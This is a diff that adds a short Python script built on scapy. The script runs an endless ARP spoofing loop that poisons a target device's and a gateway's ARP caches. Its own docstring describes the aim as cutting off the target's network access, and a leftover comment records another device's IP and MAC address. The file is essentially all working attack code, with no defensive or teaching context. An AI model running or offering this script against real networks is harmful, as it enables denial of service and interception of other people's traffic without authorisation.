@@ -1,0 +1,41 @@
+from scapy.all import ARP, send
+import time
+
+def arp_spoof(target_ip, gateway_ip, target_mac, gateway_mac, spoof_mac):
+    """
+    Perform ARP spoofing to cut off a target device's network.
+    :param target_ip: The IP address of the target device
+    :param gateway_ip: The IP address of the gateway/router
+    :param target_mac: The MAC address of the target device
+    :param gateway_mac: The MAC address of the gateway/router
+    :param spoof_mac: The MAC address to spoof (your own or a fake one)
+    """
+    print(f"Starting ARP spoofing on target: {target_ip}")
+    try:
+        while True:
+            # Spoof ARP for target and gateway
+            arp_response_target = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac, hwsrc=spoof_mac)
+            arp_response_gateway = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac, hwsrc=spoof_mac)
+            send(arp_response_target, verbose=False)
+            send(arp_response_gateway, verbose=False)
+
+            print(f"Sent spoofed ARP packets: Target {target_ip} <-> Gateway {gateway_ip}")
+            time.sleep(0.5)
+
+    except KeyboardInterrupt:
+        print("\nARP spoofing stopped.")
+
+if __name__ == "__main__":
+    # Configuration (replace with your network information)
+    target_ip = "192.168.1.9"
+    gateway_ip = "192.168.1.1"
+    target_mac = "60:dd:8e:16:a5:8a"
+    gateway_mac = "aa:aa:aa:aa:aa:aa"  # Replace with your gateway MAC
+    spoof_mac = "aa:aa:aa:aa:aa:aa"
+
+    # Run ARP spoofing
+    arp_spoof(target_ip, gateway_ip, target_mac, gateway_mac, spoof_mac)
+
+
+
+    # 192.168.1.18, MAC: b4:b5:b6:f2:f4:c7
